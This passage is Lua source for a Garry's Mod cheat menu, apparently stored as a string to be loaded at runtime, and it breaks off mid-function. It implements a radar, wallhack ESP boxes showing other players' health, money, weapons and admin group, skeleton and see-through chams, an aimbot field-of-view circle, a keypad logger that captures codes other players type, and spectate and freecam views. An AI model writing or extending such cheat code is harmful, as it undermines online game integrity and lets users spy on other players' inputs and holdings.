local bE=bB.y-90;bE=math.rad(bE)bC=bC-hacka.ac:GetWide()/2;
bD=bD-hacka.ac:GetTall()/2;
local bF=bC*_math_cos(bE)-bD*_math_sin(bE)
local bG=bC*_math_sin(bE)+bD*_math_cos(bE)
bF=bF+hacka.ac:GetWide()/2;
bG=bG+hacka.ac:GetTall()/2;
if p==LocalPlayer()then
_draw_RoundedBox(1,bF,bG,gay["WH_RADAR_SIZE"],gay["WH_RADAR_SIZE"],_Color(0,255,0))
else
_draw_RoundedBox(1,bF,bG,gay["WH_RADAR_SIZE"],gay["WH_RADAR_SIZE"],team.GetColor(p:Team()))
end
end
for _,p in _pairs(_ents_FindByClass("*"))do
if _string_find(gay["WH_ENTITYLIST"]or "",p:GetClass())then
if p:GetPos():Distance(_LocalPlayer():GetPos())< gay["WH_ENTITY_DISTANCE"] then 
local bz=p:GetPos()
local bA=_LocalPlayer():GetPos()
local bB=_LocalPlayer():EyeAngles()
local bC=hacka.ac:GetWide()/2+(bz.x-bA.x)/20;
local bD=hacka.ac:GetTall()/2+(bA.y-bz.y)/20;
local bE=bB.y-90;bE=math.rad(bE)bC=bC-hacka.ac:GetWide()/2;
bD=bD-hacka.ac:GetTall()/2;
local bF=bC*_math_cos(bE)-bD*_math_sin(bE)
local bG=bC*_math_sin(bE)+bD*_math_cos(bE)
bF=bF+hacka.ac:GetWide()/2;
bG=bG+hacka.ac:GetTall()/2;
_draw_RoundedBox(1,bF,bG,gay["WH_RADAR_SIZE"],gay["WH_RADAR_SIZE"],_Color(255,0,0))
end 
end
end
draw.RoundedBox(0,0,0,t,22,Color(71,74,79))
draw.SimpleText("Radar","]]..k.menufont..[[",5,2.5,Color(120,120,120))
end
end
if IsValid(hacka.ac) and not gay["WH_RADAR"]or gay["UNLOAD"]and IsValid(hacka.ac)then
hacka.ac:Remove()
end

if gay["WH_INFO"]and not IsValid(hacka.info) then
hacka.info=vgui.Create("DFrame")
hacka.info:SetSize(gay["WH_INFO_S_X"],gay["WH_INFO_S_Y"])
hacka.info:SetPos(gay["WH_INFO_X"],gay["WH_INFO_Y"])
hacka.info:SetTitle("")
hacka.info:SetSizable(true)
hacka.info:ShowCloseButton(false)
hacka.info.PerformLayout=function(self,c,d)
zapic("WH_INFO_S_X",c)
zapic("WH_INFO_S_Y",d)
end
function hacka.info:Paint(w,h)
draw.RoundedBox(0,0,0,w,h,Color(30,30,30))
draw.RoundedBox(0,0,0,w,22,Color(71,74,79))
draw.RoundedBox(0,0,22,w,1,Color(0,0,0))
draw.SimpleText("Info","]]..k.menufont..[[",5,2.5,Color(120,120,120))
surface.SetDrawColor(Color(0,0,0))
surface.DrawOutlinedRect(0,0,w,h)
surface.SetDrawColor(Color(50,50,50))
surface.DrawOutlinedRect(1,23,w-2,h-24)
_draw_SimpleText("Health: ".._LocalPlayer():Health()or"Health: error","]]..k.menufont..[[",2.5,25,Color(255,255,255))
_draw_SimpleText("Armor: ".._LocalPlayer():Armor()or"Armor: error","]]..k.menufont..[[",2.5,25+15,Color(255,255,255))
_draw_SimpleText("Velocity: "..math.Round(_LocalPlayer():GetVelocity():Length())or"Velocity: error","]]..k.menufont..[[",2.5,25+15+15,Color(255,255,255))
_draw_SimpleText("Server: "..GetHostName()or"Server: error","]]..k.menufont..[[",2.5,70,Color(255,255,255))
_draw_SimpleText("Online: "..#player.GetAll()or"Online: error","]]..k.menufont..[[",2.5,85,Color(255,255,255))
_draw_SimpleText("Map: "..game.GetMap()or"Map: error","]]..k.menufont..[[",2.5,100,Color(255,255,255))
_draw_SimpleText("Entities: "..math.Round(ents.GetCount()-player.GetCount()*12)or"Entities: error","]]..k.menufont..[[",2.5,115,Color(255,255,255))
_draw_SimpleText("Frames: "..math.Round(1/FrameTime())or"Frames: error","]]..k.menufont..[[",2.5,130,Color(255,255,255))
_draw_SimpleText("Ping: ".._LocalPlayer():Ping()or"Ping: error","]]..k.menufont..[[",2.5,145,Color(255,255,255))
_draw_SimpleText("Date: "..os.date("%d %b %Y")or"Date: error","]]..k.menufont..[[",2.5,160,Color(255,255,255))
_draw_SimpleText("Time: "..os.date("%H:%M:%S")or"Time: error","]]..k.menufont..[[",2.5,175,Color(255,255,255))
_draw_SimpleText("Tickrate: "..math.Round(1/engine.TickInterval())or"TickInterval: error","]]..k.menufont..[[",2.5,190,Color(255,255,255))
_draw_SimpleText("Gamemode: "..engine.ActiveGamemode()or"Gamemode: error","]]..k.menufont..[[",2.5,190+15,Color(255,255,255))
if IsValid(LocalPlayer():GetActiveWeapon())then 
_draw_SimpleText("Clip: "..LocalPlayer():GetActiveWeapon():Clip1().."/"..LocalPlayer():GetAmmoCount(LocalPlayer():GetActiveWeapon():GetPrimaryAmmoType()) or"Clip: error","]]..k.menufont..[[",2.5,190+15+15,Color(255,255,255))
end
end
end
if IsValid(hacka.info)and not gay["WH_INFO"]or gay["UNLOAD"]and IsValid(hacka.info)then
hacka.info:Remove()
end
end)

_timer_Create("]]..c()..[[",30,0,function()
if gay["MISC_SPECTATORLIST"]then
local pos,otsos=hacka.specb:GetPos()
zapic("MISC_SPECTATORLIST_X",pos)
zapic("MISC_SPECTATORLIST_Y",otsos)
end
if gay["WH_MIRROR"]then
local pos,otsos=hacka.mirror:GetPos()
zapic("WH_MIRROR_X",pos)
zapic("WH_MIRROR_Y",otsos)
end
if gay["WH_RADAR"]then
local pos,otsos=hacka.ac:GetPos()
zapic("WH_RADAR_X",pos)
zapic("WH_RADAR_Y",otsos)
end
if gay["WH_INFO"]then
local pos,otsos=hacka.info:GetPos()
zapic("WH_INFO_X",pos)
zapic("WH_INFO_Y",otsos)
end
if gay["MISC_ADMINLIST"]then
local pos,otsos=hacka.adminlist:GetPos()
zapic("MISC_ADMINLIST_X",pos)
zapic("MISC_ADMINLIST_Y",otsos)
end
end)


_hook_Add("PreDrawViewModel","]]..c()..[[",function(vm)
if gay["UNLOAD"] then return end
if hacka.loadedfinished==nil then return end
if not gay["WH_VMCHAMS"]then return end
if not vm then return end
render.SetLightingMode(2)
for k,v in pairs(vm:GetMaterials())do
if v:find("v_hands")then
render.MaterialOverrideByIndex(k-1,chamsweaponmaterial2)
render.SetColorModulation(gay["WH_VMCHAMS_COLOR"]["r"]/255,gay["WH_VMCHAMS_COLOR"]["g"]/255,gay["WH_VMCHAMS_COLOR"]["b"]/255)
else
render.MaterialOverrideByIndex(k-1,chamsweaponmaterial)
render.SetColorModulation(gay["WH_VMCHAMS_COLOR"]["r"]/255,gay["WH_VMCHAMS_COLOR"]["g"]/255,gay["WH_VMCHAMS_COLOR"]["b"]/255)
end
end
end)

_hook_Add("PostDrawViewModel","]]..c()..[[",function(vm)
if gay["UNLOAD"] then return end
if hacka.loadedfinished==nil then return end
if gay["WH_FULLBRIGHT"] then
_render_SetLightingMode(0)
end
if not gay["WH_VMCHAMS"]then return end
if not vm then return end
render.SetLightingMode(0)
for k,v in pairs(vm:GetMaterials())do
render.MaterialOverrideByIndex(k-1,nil)
end
end)

_hook_Add("HUDPaint","]]..c()..[[",function()
if gay["UNLOAD"] then return end
if hacka.loadedfinished==nil then return end
_xpcall(function()

if gay["AIM_DRAWFOV"] and gay["AIM_ENABLED"]then
_surface_DrawCircle(_ScrW()/2,_ScrH()/2,gay["AIM_FOV"]*4,gay["WH_FOV_COLOR"])
end

if gay["WH_CURSORENTITYNAME"]then
local dfgdf=_LocalPlayer():GetEyeTrace().Entity:GetClass()
if dfgdf!="worldspawn"then
_draw_SimpleText(dfgdf,"]]..k.font18 ..[[",_ScrW()/2,_ScrH()/2,_Color(255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
end
end

if gay["WH_SNAPLINE"]then
if hacka.aitarget and IsValid(hacka.aitarget) then
local pos = vm.ToScreen(em.LocalToWorld(hacka.aitarget, em.OBBCenter(hacka.aitarget)));
surface.SetDrawColor( 255,255,255 );
surface.DrawLine(ScrW() / 2, ScrH() / 2, pos.x, pos.y);
end
end

if gay["WH_CROSSHAIR"]then
local k=ScrH()/2
local r=ScrW()/2
local dezat=gay["WH_CROSSHAIR_SIZE"]
surface.SetDrawColor(gay["WH_CROSSHAIR_COLOR"])
surface.DrawLine(r+dezat,k,r-dezat,k)
surface.DrawLine(r,k+dezat,r,k-dezat)
end

if gay["MISC_KEYPADLOGGER"]then
for b,q in _pairs(_ents_FindByClass("Keypad"))do
if q:GetStatus()==1 then
if gay["KEYPADTYPE"]==1 then
if not _string_find(q:GetText(),"*")then 
hacka.keypadlogger[q]=q:GetText()
end
else
if not _string_find(q:GetDisplayText(),"*")then 
hacka.keypadlogger[q]=q:GetDisplayText()
end
end
end
if hacka.keypadlogger[q]then
_surface_SetFont("]]..l["WH_FONT"]..[[")
local tw,th=_surface_GetTextSize(hacka.keypadlogger[q])
_surface_SetTextPos(q:LocalToWorld(q:OBBCenter()):ToScreen().x-tw/2,q:LocalToWorld(q:OBBCenter()):ToScreen().y-th/2)
_surface_SetTextColor(gay["MISC_KEYPADLOGGER_COLOR"])
_surface_DrawText(hacka.keypadlogger[q])
end
end 
end

for k,v in _pairs(_player_GetAll())do
local myang = LocalPlayer():GetAngles()
local ang = (v:GetPos() - LocalPlayer():GetPos()):Angle()
local angdiffy = math.abs(math.NormalizeAngle(myang.y - ang.y ))
local angdiffp = math.abs(math.NormalizeAngle(myang.p - ang.p ))
if UtilityCheck(v) and v:GetPos():Distance(_LocalPlayer():GetPos()) < gay["WH_DISTANCE"] then

if (angdiffy < 80 and angdiffp < 80) or hacka.noclipenebled or hacka.miscthipisidion then

local pos=v:GetPos()
local pos,pos2=vm.ToScreen(pos-Vector(0,0,5)),vm.ToScreen(pos+Vector(0,0,70))
local h=pos.y-pos2.y
local w=h/2.2
local esp_up=0
local esp_down=0
local esp_right=0
local esp_left=0

_surface_SetFont("]]..l["WH_FONT"]..[[")

if gay["WH_HEALTH"]then

if gay["WH_HEALTH_TYPETYPE"]=="Text + Bar"then

local tw,th=surface.GetTextSize(v:Health())
if gay["WH_HEALTH_POSITION"]=="Up"then
surface.SetTextPos( pos.x - tw / 2, pos.y - h + 2 - th - esp_up );
esp_up=esp_up+15
elseif gay["WH_HEALTH_POSITION"]=="Down"then
surface.SetTextPos( pos.x - tw / 2, pos.y - th / 2 + 5 + esp_down  );
esp_down=esp_down+15
elseif gay["WH_HEALTH_POSITION"]=="Right"then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right=esp_right+15
elseif gay["WH_HEALTH_POSITION"]=="Left"then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left=esp_left+15
end
if gay["WH_HEALTH_TYPECOLOR"]=="Custom"then
surface.SetTextColor(gay["WH_HEALTH_COLOR"]["r"],gay["WH_HEALTH_COLOR"]["g"],gay["WH_HEALTH_COLOR"]["b"])
else
surface.SetTextColor((100-v:Health())*2.55,v:Health()*2.55,0,255)
end
surface.DrawText(v:Health())


if gay["WH_HEALTH_POSITION"]=="Left"then
local hp=v:Health()*h/100
if hp>h then hp=h end
local diff=h-hp
_surface_SetDrawColor(0,0,0,255)
_surface_DrawRect(pos.x-w/2-5,pos.y-h-1,3,h+2)
if gay["WH_HEALTH_TYPECOLOR"]=="Custom"then
surface.SetTextColor(gay["WH_HEALTH_COLOR"]["r"],gay["WH_HEALTH_COLOR"]["g"],gay["WH_HEALTH_COLOR"]["b"])
else
_surface_SetDrawColor((100-v:Health())*2.55,v:Health()*2.55,0,255)
end
_surface_DrawRect(pos.x-w/2-4,pos.y-h+diff,1,hp)
else
local hp=v:Health()*h/100
if hp>h then hp=h end
local diff=h-hp
_surface_SetDrawColor(0,0,0,255)
_surface_DrawRect(pos.x+w/2-5+5,pos.y-h-1,3,h+2)
if gay["WH_HEALTH_TYPECOLOR"]=="Custom"then
surface.SetTextColor(gay["WH_HEALTH_COLOR"]["r"],gay["WH_HEALTH_COLOR"]["g"],gay["WH_HEALTH_COLOR"]["b"])
else
_surface_SetDrawColor((100-v:Health())*2.55,v:Health()*2.55,0,255)
end
_surface_DrawRect(pos.x+w/2-4+5,pos.y-h+diff,1,hp)
end



elseif gay["WH_HEALTH_TYPETYPE"]=="Text"then
local tw,th=surface.GetTextSize(v:Health())
if gay["WH_HEALTH_POSITION"]=="Up"then
surface.SetTextPos( pos.x - tw / 2, pos.y - h + 2 - th - esp_up );
esp_up=esp_up+15
elseif gay["WH_HEALTH_POSITION"]=="Down"then
surface.SetTextPos( pos.x - tw / 2, pos.y - th / 2 + 5 + esp_down  );
esp_down=esp_down+15
elseif gay["WH_HEALTH_POSITION"]=="Right"then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right=esp_right+15
elseif gay["WH_HEALTH_POSITION"]=="Left"then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left=esp_left+15
end
if gay["WH_HEALTH_TYPECOLOR"]=="Custom"then
surface.SetTextColor(gay["WH_HEALTH_COLOR"]["r"],gay["WH_HEALTH_COLOR"]["g"],gay["WH_HEALTH_COLOR"]["b"])
else
surface.SetTextColor((100-v:Health())*2.55,v:Health()*2.55,0,255)
end
surface.DrawText(v:Health())

else

if gay["WH_HEALTH_POSITION"]=="Left"then
local hp=v:Health()*h/100
if hp>h then hp=h end
local diff=h-hp
_surface_SetDrawColor(0,0,0,255)
_surface_DrawRect(pos.x-w/2-5,pos.y-h-1,3,h+2)
if gay["WH_HEALTH_TYPECOLOR"]=="Custom"then
surface.SetTextColor(gay["WH_HEALTH_COLOR"]["r"],gay["WH_HEALTH_COLOR"]["g"],gay["WH_HEALTH_COLOR"]["b"])
else
_surface_SetDrawColor((100-v:Health())*2.55,v:Health()*2.55,0,255)
end
_surface_DrawRect(pos.x-w/2-4,pos.y-h+diff,1,hp)
else
local hp=v:Health()*h/100
if hp>h then hp=h end
local diff=h-hp
_surface_SetDrawColor(0,0,0,255)
_surface_DrawRect(pos.x+w/2-5+5,pos.y-h-1,3,h+2)
if gay["WH_HEALTH_TYPECOLOR"]=="Custom"then
surface.SetTextColor(gay["WH_HEALTH_COLOR"]["r"],gay["WH_HEALTH_COLOR"]["g"],gay["WH_HEALTH_COLOR"]["b"])
else
_surface_SetDrawColor((100-v:Health())*2.55,v:Health()*2.55,0,255)
end
_surface_DrawRect(pos.x+w/2-4+5,pos.y-h+diff,1,hp)
end
end

end


if gay["WH_ARMOR"]then

if gay["WH_ARMOR_TYPETYPE"]=="Text + Bar"then

local tw,th=surface.GetTextSize(v:Armor())
if gay["WH_ARMOR_POSITION"]=="Up"then
surface.SetTextPos( pos.x - tw / 2, pos.y - h + 2 - th - esp_up );
esp_up=esp_up+15
elseif gay["WH_ARMOR_POSITION"]=="Down"then
surface.SetTextPos( pos.x - tw / 2, pos.y - th / 2 + 5 + esp_down  );
esp_down=esp_down+15
elseif gay["WH_ARMOR_POSITION"]=="Right"then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right=esp_right+15
elseif gay["WH_ARMOR_POSITION"]=="Left"then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left=esp_left+15
end
surface.SetTextColor(gay["WH_ARMOR_COLOR"]["r"],gay["WH_ARMOR_COLOR"]["g"],gay["WH_ARMOR_COLOR"]["b"])
surface.DrawText(v:Armor())


if gay["WH_ARMOR_POSITION"]=="Left"then
local hp=v:Armor()*h/100
if hp>h then hp=h end
local diff=h-hp
_surface_SetDrawColor(0,0,0,255)
_surface_DrawRect(pos.x-w/2-1,pos.y-h-1,3,h+2)
_surface_SetDrawColor(gay["WH_ARMOR_COLOR"])
_surface_DrawRect(pos.x-w/2,pos.y-h+diff,1,hp)
else
local hp=v:Armor()*h/100
if hp>h then hp=h end
local diff=h-hp
_surface_SetDrawColor(0,0,0,255)
_surface_DrawRect(pos.x+w/2-1+5,pos.y-h-1,3,h+2)
surface.SetTextColor(gay["WH_ARMOR_COLOR"]["r"],gay["WH_ARMOR_COLOR"]["g"],gay["WH_ARMOR_COLOR"]["b"])
_surface_DrawRect(pos.x+w/2+5,pos.y-h+diff,1,hp)
end



elseif gay["WH_ARMOR_TYPETYPE"]=="Text"then
local tw,th=surface.GetTextSize(v:Armor())
if gay["WH_ARMOR_POSITION"]=="Up"then
surface.SetTextPos( pos.x - tw / 2, pos.y - h + 2 - th - esp_up );
esp_up=esp_up+15
elseif gay["WH_ARMOR_POSITION"]=="Down"then
surface.SetTextPos( pos.x - tw / 2, pos.y - th / 2 + 5 + esp_down  );
esp_down=esp_down+15
elseif gay["WH_ARMOR_POSITION"]=="Right"then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right=esp_right+15
elseif gay["WH_ARMOR_POSITION"]=="Left"then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left=esp_left+15
end
surface.SetTextColor(gay["WH_ARMOR_COLOR"]["r"],gay["WH_ARMOR_COLOR"]["g"],gay["WH_ARMOR_COLOR"]["b"])
surface.DrawText(v:Armor())

else

if gay["WH_ARMOR_POSITION"]=="Left"then
local hp=v:Armor()*h/100
if hp>h then hp=h end
local diff=h-hp
_surface_SetDrawColor(0,0,0,255)
_surface_DrawRect(pos.x-w/2-1,pos.y-h-1,3,h+2)
_surface_SetDrawColor(gay["WH_ARMOR_COLOR"])
_surface_DrawRect(pos.x-w/2,pos.y-h+diff,1,hp)
else
local hp=v:Armor()*h/100
if hp>h then hp=h end
local diff=h-hp
_surface_SetDrawColor(0,0,0,255)
_surface_DrawRect(pos.x+w/2-5+5,pos.y-h-1,3,h+2)
_surface_SetDrawColor(gay["WH_ARMOR_COLOR"])
_surface_DrawRect(pos.x+w/2-4+5,pos.y-h+diff,1,hp)
end
end

end



if gay["WH_JOB"]then
local tw,th=surface.GetTextSize(team.GetName(v:Team()))
if gay["WH_JOB_POSITION"]=="Up"then
surface.SetTextPos( pos.x - tw / 2, pos.y - h + 2 - th - esp_up );
esp_up=esp_up+15
elseif gay["WH_JOB_POSITION"]=="Down"then
surface.SetTextPos( pos.x - tw / 2, pos.y - th / 2 + 5 + esp_down  );
esp_down=esp_down+15
elseif gay["WH_JOB_POSITION"]=="Right"then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right=esp_right+15
elseif gay["WH_JOB_POSITION"]=="Left"then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left=esp_left+15
end
surface.SetTextColor(team.GetColor(v:Team()))
surface.DrawText(team.GetName(v:Team()))
end



if DarkRP and gay["WH_MONEY"]then
local text=DarkRP.formatMoney(v:getDarkRPVar("money"))
local tw,th=surface.GetTextSize(text)
if gay["WH_MONEY_POSITION"]=="Up"then
surface.SetTextPos( pos.x - tw / 2, pos.y - h + 2 - th - esp_up );
esp_up=esp_up+15
elseif gay["WH_MONEY_POSITION"]=="Down"then
surface.SetTextPos( pos.x - tw / 2, pos.y - th / 2 + 5 + esp_down  );
esp_down=esp_down+15
elseif gay["WH_MONEY_POSITION"]=="Right"then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right=esp_right+15
elseif gay["WH_MONEY_POSITION"]=="Left"then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left=esp_left+15
end
surface.SetTextColor(gay["WH_MONEY_COLOR"]["r"],gay["WH_MONEY_COLOR"]["g"],gay["WH_MONEY_COLOR"]["b"])
surface.DrawText(text)
end

if gay["WH_WEAPON"]then
if gay["WH_WEAPON_TYPETYPE"]=="All"then
for _,wep in _pairs(v:GetWeapons())do
local tw,th=_surface_GetTextSize(wep:GetPrintName())
if gay["WH_WEAPON_POSITION"]=="Up"then
surface.SetTextPos( pos.x - tw / 2, pos.y - h + 2 - th - esp_up );
esp_up=esp_up+15
elseif gay["WH_WEAPON_POSITION"]=="Down"then
surface.SetTextPos( pos.x - tw / 2, pos.y - th / 2 + 5 + esp_down  );
esp_down=esp_down+15
elseif gay["WH_WEAPON_POSITION"]=="Right"then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right=esp_right+15
elseif gay["WH_WEAPON_POSITION"]=="Left"then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left=esp_left+15
end
if v:GetActiveWeapon():GetPrintName()==wep:GetPrintName()then
surface.SetTextColor(Color(255,255,255))
else
surface.SetTextColor(gay["WH_WEAPON_COLOR"]["r"],gay["WH_WEAPON_COLOR"]["g"],gay["WH_WEAPON_COLOR"]["b"])
end
surface.DrawText(wep:GetPrintName())
end
elseif IsValid(v:GetActiveWeapon()or NULL)then
local tw,th=surface.GetTextSize(v:GetActiveWeapon():GetPrintName())
if gay["WH_WEAPON_POSITION"]=="Up"then
surface.SetTextPos( pos.x - tw / 2, pos.y - h + 2 - th - esp_up );
esp_up=esp_up+15
elseif gay["WH_WEAPON_POSITION"]=="Down"then
surface.SetTextPos( pos.x - tw / 2, pos.y - th / 2 + 5 + esp_down  );
esp_down=esp_down+15
elseif gay["WH_WEAPON_POSITION"]=="Right"then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right=esp_right+15
elseif gay["WH_WEAPON_POSITION"]=="Left"then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left=esp_left+15
end
surface.SetTextColor(gay["WH_WEAPON_COLOR"]["r"],gay["WH_WEAPON_COLOR"]["g"],gay["WH_WEAPON_COLOR"]["b"])
surface.DrawText(v:GetActiveWeapon():GetPrintName())
end
end

if gay["WH_USERGROUP"]then
local tw,th=surface.GetTextSize(v:GetUserGroup())
if gay["WH_USERGROUP_POSITION"]=="Up"then
surface.SetTextPos( pos.x - tw / 2, pos.y - h + 2 - th - esp_up );
esp_up=esp_up+15
elseif gay["WH_USERGROUP_POSITION"]=="Down"then
surface.SetTextPos( pos.x - tw / 2, pos.y - th / 2 + 5 + esp_down  );
esp_down=esp_down+15
elseif gay["WH_USERGROUP_POSITION"]=="Right"then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right=esp_right+15
elseif gay["WH_USERGROUP_POSITION"]=="Left"then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left=esp_left+15
end
surface.SetTextColor(gay["WH_USERGROUP_COLOR"]["r"],gay["WH_USERGROUP_COLOR"]["g"],gay["WH_USERGROUP_COLOR"]["b"])
surface.DrawText(v:GetUserGroup())
end




if gay["WH_NAME"]then
local tw,th=surface.GetTextSize(pm.Name(v))
if gay["WH_NAME_POSITION"]=="Up"then
surface.SetTextPos( pos.x - tw / 2, pos.y - h + 2 - th - esp_up)
esp_up=esp_up+15
elseif gay["WH_NAME_POSITION"]=="Down"then
surface.SetTextPos( pos.x - tw / 2, pos.y - th / 2 + 5 + esp_down  );
esp_down=esp_down+15
elseif gay["WH_NAME_POSITION"]=="Right"then
surface.SetTextPos(pos.x+w/2+10,pos.y-h+esp_right);
esp_right=esp_right+15
elseif gay["WH_NAME_POSITION"]=="Left"then
surface.SetTextPos(pos.x-w/2-tw-10,pos.y-h+esp_left);
esp_left=esp_left+15
end
if string.find(gay["AIMBOT_FRIEND"],v:SteamID64()or'')then
surface.SetTextColor(0,255,0)
else
surface.SetTextColor(gay["WH_NAME_COLOR"]["r"],gay["WH_NAME_COLOR"]["g"],gay["WH_NAME_COLOR"]["b"])
end
surface.DrawText(pm.Name(v))
end













if gay["WH_SKELETON"]then
local origin=v:GetPos()
for i=1,v:GetBoneCount()do
local parent=v:GetBoneParent(i)
if not parent then continue end
local bonepos,parentpos = v:GetBonePosition(i),v:GetBonePosition(parent)
if !bonepos || !parentpos || bonepos == origin then continue end
local bs,ps=bonepos:ToScreen(),parentpos:ToScreen()
if gay["WH_SKELETON_COLORTYPE"]=="Team"then
surface.SetDrawColor(team.GetColor(v:Team()))
else
surface.SetDrawColor(gay["WH_SKELETON_COLOR"])
end
surface.DrawLine(bs.x,bs.y,ps.x,ps.y)
end
end

if gay["WH_CHAMS"]then
if gay["WH_CHAMS_TYPE"]=="Type 1"then
cam.Start3D(EyePos(),EyeAngles())
_cam_IgnoreZ(true)
_render_SuppressEngineLighting(true)
v:DrawModel()
_cam_IgnoreZ(false)
_render_SuppressEngineLighting(false)
_cam_End3D()
else
cam.Start3D()
render.MaterialOverride(chamsmaterial)
if gay["WH_CHAMS_COLORTYPE"]=="Custom"then
render.SetColorModulation(gay["WH_CHAMS_COLOR"]["r"]/255,gay["WH_CHAMS_COLOR"]["g"]/255,gay["WH_CHAMS_COLOR"]["b"]/255)
else
render.SetColorModulation(team.GetColor(v:Team())["r"]/255,team.GetColor(v:Team())["g"]/255,team.GetColor(v:Team())["b"]/255)
end
em.DrawModel(v)
cam.End3D()
end
end

if gay["WH_BOX"]then
if gay["WH_BOX_TYPETYPE"]=="2d"then 
local pos=em.GetPos(v)
local pos,aj=vm.ToScreen(pos-Vector(0,0,5)),vm.ToScreen(pos+Vector(0,0,70))
local u=pos.y-aj.y;
local t=u/2.2;
if gay["WH_BOX_TYPECOLOR"]=="Custom"then
_surface_SetDrawColor(gay["WH_BOX_COLOR"])
else
_surface_SetDrawColor(team.GetColor(v:Team()))
end
_surface_DrawOutlinedRect(pos.x-t/2,pos.y-u,t,u)
else
cam.Start3D()
if gay["WH_BOX_TYPECOLOR"]=="Custom"then
_render_DrawWireframeBox(v:GetPos(),Angle(0,v:EyeAngles().y,0),v:OBBMins(),v:OBBMaxs(),gay["WH_BOX_COLOR"])
else
_render_DrawWireframeBox(v:GetPos(),Angle(0,v:EyeAngles().y,0),v:OBBMins(),v:OBBMaxs(),team.GetColor(v:Team()))
end
_cam_End3D()
end
end
end
end
end

for _,p in _pairs(_ents_FindByClass("*"))do
local nameent=p:GetClass()
if _string_find(gay["WH_ENTITYLIST"]or "",nameent)then
if p:GetPos():Distance(_LocalPlayer():GetPos())< gay["WH_ENTITY_DISTANCE"]then 

if gay["WH_ENTITY_CHAMS"]and nameent!="worldspawn" then
cam.Start3D(EyePos(),EyeAngles())
_cam_IgnoreZ(true)
_render_SuppressEngineLighting(true)
p:DrawModel()
_cam_IgnoreZ(false)
_render_SuppressEngineLighting(false)
_cam_End3D()
end

if gay["WH_ENTITY_NAME"] then
_surface_SetFont("]]..l["WH_FONT"]..[[")
if nameent=="derma_printer"then
local tw,th=_surface_GetTextSize(nameent.." ("..p:GetMoney()..")")
_surface_SetTextPos(p:LocalToWorld(p:OBBCenter()):ToScreen().x-tw/2,p:LocalToWorld(p:OBBCenter()):ToScreen().y-th/2)
_surface_SetTextColor(gay["WH_ENTITY_NAME_COLOR"])
_surface_DrawText(nameent.." ("..DarkRP.formatMoney(p:GetMoney())..")")
elseif nameent=="spawned_money"then
local tw,th=_surface_GetTextSize(nameent.." ("..DarkRP.formatMoney(tostring(p:Getamount())or 100)..")")
_surface_SetTextPos(p:LocalToWorld(p:OBBCenter()):ToScreen().x-tw/2,p:LocalToWorld(p:OBBCenter()):ToScreen().y-th/2)
_surface_SetTextColor(gay["WH_ENTITY_NAME_COLOR"])
_surface_DrawText(nameent.." ("..DarkRP.formatMoney(tostring(p:Getamount())or 100)..")")
else
local tw,th=_surface_GetTextSize(nameent)
_surface_SetTextPos(p:LocalToWorld(p:OBBCenter()):ToScreen().x-tw/2,p:LocalToWorld(p:OBBCenter()):ToScreen().y-th/2)
_surface_SetTextColor(gay["WH_ENTITY_NAME_COLOR"])
_surface_DrawText(nameent)
end
end

if gay["WH_ENTITY_BOX"]then
if gay["WH_ENTITY_BOX_TYPE"]=="3d"then
cam.Start3D()
_render_DrawWireframeBox(p:GetPos(),p:EyeAngles(),p:OBBMins(),p:OBBMaxs(),gay["WH_ENTITY_BOX_COLOR"])
_cam_End3D()
else
surface.SetDrawColor(gay["WH_ENTITY_BOX_COLOR"])
local x1,y1,x2,y2=box2d(p)
surface.DrawLine(x1,y1,math.min(x1+500,x2),y1)
surface.DrawLine(x1,y1,x1,math.min(y1+500,y2))
surface.DrawLine(x2,y1,math.max(x2-500,x1),y1)
surface.DrawLine(x2,y1,x2,math.min(y1+500,y2))
surface.DrawLine(x1,y2,math.min(x1+500,x2),y2)
surface.DrawLine(x1,y2,x1,math.max(y2-500,y1))
surface.DrawLine(x2,y2,math.max(x2-500,x1),y2)
surface.DrawLine(x2,y2,x2,math.max(y2-500,y1))
end
end

end
end
end

end,function(a)print(a)end)
end)

_hook_Add("CalcView","]]..c()..[[",function(_,origin,angles,zopa)
if gay["UNLOAD"] then return end
if hacka.loadedfinished==nil then return end

if gay["MISC_SPECTATE_TARGET"]!=""then
local plys=Player(gay["MISC_SPECTATE_TARGET"])
if plys and IsValid(plys) then
local n={}
n.origin=plys:EyePos()or Vector(0,0,0)
n.angles=plys:EyeAngles()or Angle(0,0,0)
n.fov=origin
n.drawviewer=true
return n
end
end

if hacka.noclipenebled then
if hacka.setview then
hacka.vieworigin=origin
hacka.viewangle=angles
hacka.setview=false
end
return{origin=hacka.vieworigin,angles=hacka.viewangle}
end

if hacka.miscthipisidion then
local D={}
local E=gay["WH_THIRDPERSON_DISTANCE"];
local F={}
F.start=origin;
F.endpos=origin-angles:Forward()*E;F.filter=_LocalPlayer()
local F=util.TraceLine(F)
if F.HitPos:Distance(origin)<E-10 then 
E=F.HitPos:Distance(origin)-10 
end;
D.origin=origin-angles:Forward()*E;D.angles=angles;D.fov=zopa;
return D 
end

if gay["WH_FOVVIEW"] > 100 or gay["NOSWAY"] then
local n={}
n.origin=origin
if gay["NOSWAY"]then
n.angles=_LocalPlayer():EyeAngles()
else
n.angles=angles
end
n.fov=gay["WH_FOVVIEW"]
n.SetView=false
return n
end

end)
_hook_Add("ShouldDrawLocalPlayer","]]..c()..[[",function(n)
